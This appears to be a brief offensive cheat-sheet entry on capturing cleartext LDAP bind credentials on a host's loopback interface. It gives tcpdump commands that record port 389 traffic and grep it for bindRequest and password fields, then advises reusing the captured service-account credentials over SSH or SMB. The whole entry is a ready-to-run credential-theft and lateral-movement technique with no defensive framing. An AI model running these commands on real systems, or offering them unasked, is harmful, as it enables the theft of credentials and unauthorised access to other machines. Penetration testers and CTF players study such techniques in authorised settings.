# tcpdump Localhost LDAP Cleartext Sniff

When LDAP (port 389) is running locally and an application authenticates over it in cleartext, sniff the loopback interface while triggering a page/action that forces a bind:

```bash
tcpdump -i lo -w /tmp/ldap.pcap port 389 &
# trigger the LDAP authentication (visit the page, run a cron job, etc.)
# then Ctrl+C and read the pcap
tcpdump -r /tmp/ldap.pcap -A | grep -i 'bindRequest\|password\|userPassword\|pass'
```

Or read directly as text:
```bash
tcpdump -i lo -A port 389 2>/dev/null | grep -v '^$'
```

LDAP simple bind sends credentials in plaintext — the `bindRequest` packet contains username + password.  
Credentials typically belong to a service account; reuse via SSH or SMB.
